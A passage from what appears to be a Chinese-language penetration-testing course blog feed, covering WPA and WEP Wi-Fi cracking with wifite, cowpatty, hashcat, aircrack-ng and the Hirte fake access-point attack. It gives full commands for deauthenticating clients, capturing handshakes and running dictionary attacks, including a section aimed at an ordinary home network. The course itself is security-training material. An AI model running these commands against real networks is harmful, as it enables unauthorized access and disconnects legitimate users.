alt="image-20211216111856491"></p><h3 id="15-等待破解结果"><a href="#15-等待破解结果" class="headerlink" title="15.等待破解结果"></a>15.等待破解结果</h3><p><img src="images/image-20211216111911462.png" alt="image-20211216111911462"></p><h3 id="16-点击【确定】，记录wifi密码"><a href="#16-点击【确定】，记录wifi密码" class="headerlink" title="16.点击【确定】，记录wifi密码"></a>16.点击【确定】，记录wifi密码</h3><p><img src="images/image-20211216111924364.png" alt="image-20211216111924364"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi12-wpa-zi-dong-hua-shen-tou-wpa-jia-mi/di-12-zhang-wpa-zi-dong-hua-shen-tou-wpa-jia-mi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi12-wpa-zi-dong-hua-shen-tou-wpa-jia-mi/di-12-zhang-wpa-zi-dong-hua-shen-tou-wpa-jia-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA-自动化渗透WPA加密"><a href="#WPA-自动化渗透WPA加密" class="headerlink" title="WPA-自动化渗透WPA加密"></a>WPA-自动化渗透WPA加密</h1><h2 id="1-开启监听模式"><a href="#1-开启监听模式" class="headerlink" title="1.开启监听模式"></a>1.开启监听模式</h2><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-指定密码破解"><a href="#2-指定密码破解" class="headerlink" title="2.指定密码破解"></a>2.指定密码破解</h2><pre class="line-numbers language-none"><code class="language-none">wifite --dict /root/wifi/passwd.txt--dict:指定密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-等待扫描到WiFi，停止扫描"><a href="#3-等待扫描到WiFi，停止扫描" class="headerlink" title="3.等待扫描到WiFi，停止扫描"></a>3.等待扫描到WiFi，停止扫描</h2><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211215151002895.png" alt="image-20211215151002895"></p><h2 id="4-选择WiFi序号开始扫描"><a href="#4-选择WiFi序号开始扫描" class="headerlink" title="4.选择WiFi序号开始扫描"></a>4.选择WiFi序号开始扫描</h2><p><img src="images/image-20211215151021987.png" alt="image-20211215151021987"></p><h2 id="5-指定密码大字典破解"><a href="#5-指定密码大字典破解" class="headerlink" title="5.指定密码大字典破解"></a>5.指定密码大字典破解</h2><pre class="line-numbers language-none"><code class="language-none">wifite --dict /root/wifi/pwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi11-wpa-chuang-jian-hash-table-jia-su-bing-yong-cowpatty-shen-tou/di-11-zhang-wpa-po-jie-chuang-jian-hash-table-jia-su-bing-yong-cowpatty-po-jie/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi11-wpa-chuang-jian-hash-table-jia-su-bing-yong-cowpatty-shen-tou/di-11-zhang-wpa-po-jie-chuang-jian-hash-table-jia-su-bing-yong-cowpatty-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA破解-创建Hash-table加速并用Cowpatty破解"><a href="#WPA破解-创建Hash-table加速并用Cowpatty破解" class="headerlink" title="WPA破解-创建Hash-table加速并用Cowpatty破解"></a>WPA破解-创建Hash-table加速并用Cowpatty破解</h1><h2 id="1-Cowpatty-软件介绍"><a href="#1-Cowpatty-软件介绍" class="headerlink" title="1.Cowpatty 软件介绍"></a>1.Cowpatty 软件介绍</h2><p>CoWPAtty是WPA-PSK的自动字典攻击工具，它运行在Linux上，该程序具有命令行界面，并使用字典进行密码攻击。</p><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="1-安装CoWPAtty"><a href="#1-安装CoWPAtty" class="headerlink" title="1.安装CoWPAtty"></a>1.安装CoWPAtty</h3><pre class="line-numbers language-none"><code class="language-none">cowpatty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211209152646289.png" alt="image-20211209152646289"></p><h3 id="2-抓握手包"><a href="#2-抓握手包" class="headerlink" title="2.抓握手包"></a>2.抓握手包</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 -c:指定信道--bssid:AP的MAC地址-w:保存抓包结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-重新连接wifi"><a href="#3-重新连接wifi" class="headerlink" title="3.重新连接wifi"></a>3.重新连接wifi</h3><h3 id="4-渗透WPA-wifi"><a href="#4-渗透WPA-wifi" class="headerlink" title="4.渗透WPA wifi"></a>4.渗透WPA wifi</h3><pre class="line-numbers language-none"><code class="language-none">cowpatty -f /root/wifi/passwd.txt -r  wpa-1-01.cap -s cisco-1809-f:字典文件-r:数据包捕获文件-s:网络SSID（如果SSID包含空格，则使用引号括起来）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/image-20211209152816034.png" alt="image-20211209152816034"></p><h3 id="5-使用大字典破解"><a href="#5-使用大字典破解" class="headerlink" title="5.使用大字典破解"></a>5.使用大字典破解</h3><pre class="line-numbers language-none"><code class="language-none">cowpatty -f /root/wifi/pwd.txt -r  wpa-1-01.cap -s cisco-1809<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211209152848877.png" alt="image-20211209152848877"></p><h2 id="3-hash-table加速"><a href="#3-hash-table加速" class="headerlink" title="3.hash-table加速"></a>3.hash-table加速</h2><h3 id="1-将密码字典生成hash-table"><a href="#1-将密码字典生成hash-table" class="headerlink" title="1.将密码字典生成hash-table"></a>1.将密码字典生成hash-table</h3><pre class="line-numbers language-none"><code class="language-none">genpmk -f  pwd.txt -d ./pwdhash -s cisco-1809<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211209153002704.png" alt="image-20211209153002704"></p><p>生成hask-table速度比较慢，但是具有可传播性，大家如果跟我视频设置的是一样的wifi名称和一样的密码规则，可以直接使用而课程附件里生成好的hash-table直接破解</p><h3 id="2-加速渗透"><a href="#2-加速渗透" class="headerlink" title="2.加速渗透"></a>2.加速渗透</h3><pre class="line-numbers language-none"><code class="language-none">cowpatty -d /root/wifi/pwdhash -r  wpa-1-01.cap -s cisco-1809<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211209153101178.png" alt="image-20211209153101178"></p><h2 id="4-课程小结"><a href="#4-课程小结" class="headerlink" title="4.课程小结"></a>4.课程小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi10-wpa-hashcat-pao-bao-shen-tou/di-10-zhang-wpa-hashcat-shen-tou/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi10-wpa-hashcat-pao-bao-shen-tou/di-10-zhang-wpa-hashcat-shen-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA-hashcat渗透"><a href="#WPA-hashcat渗透" class="headerlink" title="WPA-hashcat渗透"></a>WPA-hashcat渗透</h1><p>严重声明:cpu加速都是幌子，aricrack-ng也用cpu，不然用爱跑的？</p><h2 id="1-hashcat介绍"><a href="#1-hashcat介绍" class="headerlink" title="1.hashcat介绍"></a>1.hashcat介绍</h2><p>Hashcat系列软件是比较牛逼的密码破解软件,HashCat主要分为三个版本：Hashcat、oclHashcat-plus、oclHashcat-lite。</p><p>这三个版本的主要区别是：</p><p>HashCat只支持CPU破解。</p><p>oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种</p><p>oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。</p><p>如果只有单个密文进行破解的话，推荐使用oclHashCat-lite。</p><h2 id="2-渗透姿势"><a href="#2-渗透姿势" class="headerlink" title="2.渗透姿势"></a>2.渗透姿势</h2><h3 id="1-查看网卡"><a href="#1-查看网卡" class="headerlink" title="1.查看网卡"></a>1.查看网卡</h3><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-开启监听模式"><a href="#2-开启监听模式" class="headerlink" title="2.开启监听模式"></a>2.开启监听模式</h3><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-扫描wifi"><a href="#3-扫描wifi" class="headerlink" title="3.扫描wifi"></a>3.扫描wifi</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-抓包保存"><a href="#4-抓包保存" class="headerlink" title="4.抓包保存"></a>4.抓包保存</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 -c:指定信道--bssid:AP的MAC地址-w:保存抓包结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-进行冲突模式攻击"><a href="#5-进行冲突模式攻击" class="headerlink" title="5.进行冲突模式攻击"></a>5.进行冲突模式攻击</h3><p>将设备踢下线，当用户重连的时候，就会抓到握手包</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）-a:设置 ap 的 mac-c：设置已连接的合法客户端的 mac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-重新连接wifi"><a href="#6-重新连接wifi" class="headerlink" title="6.重新连接wifi"></a>6.重新连接wifi</h3><p>获得握手包，用于破解</p><p><img src="images/image-20211201201536769.png" alt="image-20211201201536769"></p><h3 id="7-生成hccap文件"><a href="#7-生成hccap文件" class="headerlink" title="7.生成hccap文件"></a>7.生成hccap文件</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng wpa-1-01.cap -j wpahaccap -j &lt;file&gt;  : create Hashcat v3.6+ file (HCCAPX) -J &lt;file&gt;  : create Hashcat file (HCCAP)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="8-破解"><a href="#8-破解" class="headerlink" title="8.破解"></a>8.破解</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -m 2500 wpahaccap.hccapx /root/wifi/passwd.txt-m:指定破解类型2500:wpa/wpa2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="images/image-20211201201625121.png" alt="image-20211201201625121"></p><h3 id="9-再次查看密码"><a href="#9-再次查看密码" class="headerlink" title="9.再次查看密码"></a>9.再次查看密码</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -m 2500 wpahaccap.hccapx --show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="10-删除之前破解成功的记录"><a href="#10-删除之前破解成功的记录" class="headerlink" title="10.删除之前破解成功的记录"></a>10.删除之前破解成功的记录</h3><pre class="line-numbers language-none"><code class="language-none">rm ~/.hashcat/hashcat.potfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="11-使用大字典"><a href="#11-使用大字典" class="headerlink" title="11.使用大字典"></a>11.使用大字典</h3><p>根本没有加速</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 2500 wpahaccap.hccapx /root/wifi/pwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211201201735564.png" alt="image-20211201201735564"></p><p><img src="images/image-20211201201746153.png" alt="image-20211201201746153"></p><h2 id="3-课后小结"><a href="#3-课后小结" class="headerlink" title="3.课后小结"></a>3.课后小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi09-aircrack-ng-shen-tou-wpa-jia-mi/di-9-zhang-wap-aircrack-ng-shen-tou-wpa-jia-mi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi09-aircrack-ng-shen-tou-wpa-jia-mi/di-9-zhang-wap-aircrack-ng-shen-tou-wpa-jia-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="WPA-aircrack-ng渗透WPA加密"><a href="#WPA-aircrack-ng渗透WPA加密" class="headerlink" title="WPA-aircrack-ng渗透WPA加密"></a>WPA-aircrack-ng渗透WPA加密</h1><h2 id="1-WPA概念介绍"><a href="#1-WPA概念介绍" class="headerlink" title="1.WPA概念介绍"></a>1.WPA概念介绍</h2><p>WPA 全名 WI-FI Protected Access, 有WPA 和WPA2两个标准，是一种保护无线网络的安全协议。</p><p>WPA实现了IEEE802.11i标准的大部分，是在802.11i完备之前替代WEP的过度方案，后被WPA2取代。</p><p>由于WPA和WPA2都是基于802.11i，因此在技术层面几乎是相同的。主要区别在于WPA2要求支持更安全的CCMP。</p><h2 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2.工作原理"></a>2.工作原理</h2><p>WPA和WPA2均使用802.11i中定义的四次握手，客户端（station）和接入点（AP）通过四次握手相互验证和协商名为成对临时密钥（Pairwise Transient Key, PTK）的会话密钥。PTK通过成对主密钥（Pairwise Master key, PMK）、AP随机数ANonce、STA随机数SNonce和双方MAC地址等计算生成。其中PMK由登陆密码等双方均已知的信息计算生成，而后续正常数据加密所使用的临时密钥（Temporal KEY, TK）即派生自PTK，各密钥、参数的关系如下：</p><p><img src="images/image-20211201175811088.png" alt="image-20211201175811088"></p><p>四次握手的过程可概括如下：</p><p>（1）AP发送自己的随机数ANonce给STA</p><p>（2）STA生成随机数SNonce，计算出PTK，并将SNonce和信息完整性校验码MIC发送给AP</p><p>（3）AP收到SNonce，计算出PTK（此时双方都有PTK），将组密钥GTK加密后连同MIC发给STA</p><p>（4）STA收到GTK，安装PTK和GTK，发送ACK确认。AP收到确认后安装PTK。</p><p><img src="images/image-20211201175839342.png" alt="image-20211201175839342"></p><h2 id="3-wifi设置"><a href="#3-wifi设置" class="headerlink" title="3.wifi设置"></a>3.wifi设置</h2><h3 id="1-打开wifi设置网站"><a href="#1-打开wifi设置网站" class="headerlink" title="1.打开wifi设置网站"></a>1.打开wifi设置网站</h3><pre class="line-numbers language-none"><code class="language-none">http://192.168.1.1/                              <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-选择无线配置"><a href="#2-选择无线配置" class="headerlink" title="2.选择无线配置"></a>2.选择无线配置</h3><p><img src="images/image-20211201175942316.png" alt="image-20211201175942316"></p><h3 id="3-选择加密方式"><a href="#3-选择加密方式" class="headerlink" title="3.选择加密方式"></a>3.选择加密方式</h3><p><img src="images/image-20211201180006739.png" alt="image-20211201180006739"></p><h2 id="4-打造字典"><a href="#4-打造字典" class="headerlink" title="4.打造字典"></a>4.打造字典</h2><h3 id="1-crunch生成密码"><a href="#1-crunch生成密码" class="headerlink" title="1.crunch生成密码"></a>1.crunch生成密码</h3><pre class="line-numbers language-none"><code class="language-none">crunch 8 8 -t %%%%%,,, &gt; pwd.txt8:最小长度8:最大长度-t：定义输出格式,:代表大写字母%:代表数字^:代表符号14GB大字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看字典</p><pre class="line-numbers language-none"><code class="language-none">tail pwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-手工打造"><a href="#2-手工打造" class="headerlink" title="2.手工打造"></a>2.手工打造</h3><pre class="line-numbers language-none"><code class="language-none">vi passwd.txt12456sadasdasSXiooo116330XSX12345678<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-渗透步骤"><a href="#5-渗透步骤" class="headerlink" title="5.渗透步骤"></a>5.渗透步骤</h2><h3 id="1-查看网卡"><a href="#1-查看网卡" class="headerlink" title="1.查看网卡"></a>1.查看网卡</h3><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-开启监听模式"><a href="#2-开启监听模式" class="headerlink" title="2.开启监听模式"></a>2.开启监听模式</h3><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-扫描wifi"><a href="#3-扫描wifi" class="headerlink" title="3.扫描wifi"></a>3.扫描wifi</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-抓包保存"><a href="#4-抓包保存" class="headerlink" title="4.抓包保存"></a>4.抓包保存</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 -c:指定信道--bssid:AP的MAC地址-w:保存抓包结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-进行冲突模式攻击"><a href="#5-进行冲突模式攻击" class="headerlink" title="5.进行冲突模式攻击"></a>5.进行冲突模式攻击</h3><p>将设备踢下线，当用户重连的时候，就会抓到握手包</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）-a:设置 ap 的 mac-c：设置已连接的合法客户端的 mac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="images/image-20211201180247068.png" alt="image-20211201180247068"></p><h3 id="6-破解wifi"><a href="#6-破解wifi" class="headerlink" title="6.破解wifi"></a>6.破解wifi</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng -w /root/wifi/passwd.txt wpa-1-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211201180327419.png" alt="image-20211201180327419"></p><h3 id="7-使用大字典破解"><a href="#7-使用大字典破解" class="headerlink" title="7.使用大字典破解"></a>7.使用大字典破解</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng -w /root/wifi/pwd.txt wpa-1-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211201180351522.png" alt="image-20211201180351522"></p><h3 id="8-不指定字典破解"><a href="#8-不指定字典破解" class="headerlink" title="8.不指定字典破解"></a>8.不指定字典破解</h3><pre class="line-numbers language-none"><code class="language-none">crunch 8 8 -t %%%%%,,, | aircrack-ng wpa-1-01.cap -e cisco-1809 -w -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="images/image-20211201180447549.png" alt="image-20211201180447549"></p><p><img src="images/image-20211201180502673.png" alt="image-20211201180502673"></p><h2 id="6-渗透普通家用wifi"><a href="#6-渗透普通家用wifi" class="headerlink" title="6.渗透普通家用wifi"></a>6.渗透普通家用wifi</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --bssid 50:21:EC:97:BB:80 -w wpa-1 -c:指定信道--bssid:AP的MAC地址-w:保存抓包结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-进行冲突模式攻击"><a href="#2-进行冲突模式攻击" class="headerlink" title="2.进行冲突模式攻击"></a>2.进行冲突模式攻击</h3><p>将设备踢下线，当用户重连的时候，就会抓到握手包</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 5 -a 50:21:EC:97:BB:80 -c 18:CC:18:C5:D5:64 wlan0mon-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）-a:设置 ap 的 mac-c：设置已连接的合法客户端的 mac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-破解wifi"><a href="#3-破解wifi" class="headerlink" title="3.破解wifi"></a>3.破解wifi</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng -w /root/wifi/passwd.txt wpa-1-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7-课程小结"><a href="#7-课程小结" class="headerlink" title="7.课程小结"></a>7.课程小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi08-wep-shen-tou-xin-si-lu-hirte/di-8-zhang-wep-shen-tou-wep-xin-si-lu-hirte/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi08-wep-shen-tou-xin-si-lu-hirte/di-8-zhang-wep-shen-tou-wep-xin-si-lu-hirte/</url>
      
        <content type="html"><![CDATA[<h1 id="WEP-渗透WEP新思路–Hirte"><a href="#WEP-渗透WEP新思路–Hirte" class="headerlink" title="WEP-渗透WEP新思路–Hirte"></a>WEP-渗透WEP新思路–Hirte</h1><h2 id="1-Hirte介绍"><a href="#1-Hirte介绍" class="headerlink" title="1.Hirte介绍"></a>1.Hirte介绍</h2><p>Hirte是破解无线网络WEP Key的一种攻击类型</p><p>只要客户端设备（笔记本电脑，手机等）连接过的无线网络，那些WIFI即使是不在攻击者范围内也都能被破解，因为该wifi的WEP密钥和配置文件仍然存储在这些无线设备中。</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profile name="cisco-1809" key=clear    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实施这种攻击的要求是建立一个和WEP网络相同的SSID假冒接入点。当客户端设备尝试自动连接到无线网络设时，假冒接入点（攻击者机器）会对受害者设备进行ARP攻击，导致受害者设备将包含密钥流的数据包发出。</p><h2 id="2-Hirte破解原理"><a href="#2-Hirte破解原理" class="headerlink" title="2.Hirte破解原理"></a>2.Hirte破解原理</h2><p>1.安装一个假的WEP AP(wifi名,mac地址要相同)并等待客户端连接</p><p>2.客户端的连接等待自动分配IP地址</p><p>3.客户端发送一个ARP数据包</p><p>4.获得了ARP分组，并且将其转换成一个ARP请求为同一客户机</p><p>5.客户回复</p><p>6.收集这些数据包</p><p>7.破解WEP密钥</p><h2 id="3-渗透姿势1"><a href="#3-渗透姿势1" class="headerlink" title="3.渗透姿势1"></a>3.渗透姿势1</h2><h4 id="1-查看网卡信息"><a href="#1-查看网卡信息" class="headerlink" title="1.查看网卡信息"></a>1.查看网卡信息</h4><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-监听网卡"><a href="#2-监听网卡" class="headerlink" title="2.监听网卡"></a>2.监听网卡</h4><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-扫描附近的wifi"><a href="#3-扫描附近的wifi" class="headerlink" title="3.扫描附近的wifi"></a>3.扫描附近的wifi</h4><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-配置airodump-ng捕捉数据包并保存数据包文件名字为HSEK"><a href="#4-配置airodump-ng捕捉数据包并保存数据包文件名字为HSEK" class="headerlink" title="4.配置airodump-ng捕捉数据包并保存数据包文件名字为HSEK"></a>4.配置airodump-ng捕捉数据包并保存数据包文件名字为HSEK</h4><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon --bssid   D8:24:BD:79:18:0B --write HSEK--bssid：AP的mac地址--write：保存文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="5-开始伪造AP-用airbase-ng工具建立WEP接入点"><a href="#5-开始伪造AP-用airbase-ng工具建立WEP接入点" class="headerlink" title="5.开始伪造AP,用airbase-ng工具建立WEP接入点"></a>5.开始伪造AP,用airbase-ng工具建立WEP接入点</h4><pre class="line-numbers language-none"><code class="language-none">airbase-ng -c 1 -a  D8:24:BD:79:18:0B --essid "cisco-1809" -W 1 -N wlan0mon-c:信道-a：模拟AP的MAC地址--essid：wifi的名称-W:设置加密位-N:使Hirte攻击模式wlan0mon：是接口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-只要有客户端一连上来-就会进行攻击"><a href="#6-只要有客户端一连上来-就会进行攻击" class="headerlink" title="6.只要有客户端一连上来,就会进行攻击"></a>6.只要有客户端一连上来,就会进行攻击</h4><p><img src="images/image-20211126191930629.png" alt="image-20211126191930629"></p><p><img src="images/image-20211126191947433.png" alt="image-20211126191947433"></p><h4 id="7-启动aircrack-ng从捕获的数据包：Hirte破解WEP密钥"><a href="#7-启动aircrack-ng从捕获的数据包：Hirte破解WEP密钥" class="headerlink" title="7.启动aircrack-ng从捕获的数据包：Hirte破解WEP密钥"></a>7.启动aircrack-ng从捕获的数据包：Hirte破解WEP密钥</h4><pre class="line-numbers language-none"><code class="language-none">aircrack-ng HSEK-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>破解密码是有要求的,第一次ivs必须要大于5000,当小于这个数的话,就会提示</p><p><img src="images/image-20211126192040363.png" alt="image-20211126192040363"></p><p><img src="images/image-20211126192054536.png" alt="image-20211126192054536"></p><h2 id="4-渗透姿势2"><a href="#4-渗透姿势2" class="headerlink" title="4.渗透姿势2"></a>4.渗透姿势2</h2><h4 id="1-扫描并指定破解方式"><a href="#1-扫描并指定破解方式" class="headerlink" title="1.扫描并指定破解方式"></a>1.扫描并指定破解方式</h4><pre class="line-numbers language-none"><code class="language-none">wifite  -wep -hirte<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-加速ivs收集"><a href="#2-加速ivs收集" class="headerlink" title="2.加速ivs收集"></a>2.加速ivs收集</h4><pre class="line-numbers language-none"><code class="language-none">ping -t 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-开启攻击脚本"><a href="#3-开启攻击脚本" class="headerlink" title="3.开启攻击脚本"></a>3.开启攻击脚本</h4><pre class="line-numbers language-none"><code class="language-none">启动cmd.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-获得密钥"><a href="#4-获得密钥" class="headerlink" title="4.获得密钥"></a>4.获得密钥</h4><p><img src="images/image-20211126192808198.png" alt="image-20211126192808198"></p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi07-wep-wifite-zi-dong-hua-shen-tou-wep-jia-mi/di-7-zhang-wep-wifite-zi-dong-hua-shen-tou-wep-jia-mi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi07-wep-wifite-zi-dong-hua-shen-tou-wep-jia-mi/di-7-zhang-wep-wifite-zi-dong-hua-shen-tou-wep-jia-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="WIFI07-WEP-wifite自动化渗透WEP加密"><a href="#WIFI07-WEP-wifite自动化渗透WEP加密" class="headerlink" title="WIFI07-WEP-wifite自动化渗透WEP加密"></a>WIFI07-WEP-wifite自动化渗透WEP加密</h1><h2 id="1-wifite介绍"><a href="#1-wifite介绍" class="headerlink" title="1.wifite介绍"></a>1.wifite介绍</h2><p>wifite是一款自动化wep、wpa以及wps破解工具，不支持windows和osx。wifite的特点是可以同时攻击多个采用wep和wpa加密的网络。wifite只需简单的配置即可自动化运行，期间无需人工干预。 目前支持任何linux发行版、Backtrack 5 R1, BlackBuntu, BackBox, Kali(默认自带), CDLinux等。</p><p>wifite 破解wep加密wifi时，会采用很多种攻击方式，比如说chopchop攻击，fake欺骗认证码等等，不一定会采用哪个方式破解。不一定能一次性成功。</p><h2 id="2-扫描介绍"><a href="#2-扫描介绍" class="headerlink" title="2.扫描介绍"></a>2.扫描介绍</h2><h3 id="1-扫描无线网络"><a href="#1-扫描无线网络" class="headerlink" title="1.扫描无线网络"></a>1.扫描无线网络</h3><pre class="line-numbers language-none"><code class="language-none">wifite<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-停止wifi扫描"><a href="#2-停止wifi扫描" class="headerlink" title="2.停止wifi扫描"></a>2.停止wifi扫描</h3><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-扫描某个信道"><a href="#3-扫描某个信道" class="headerlink" 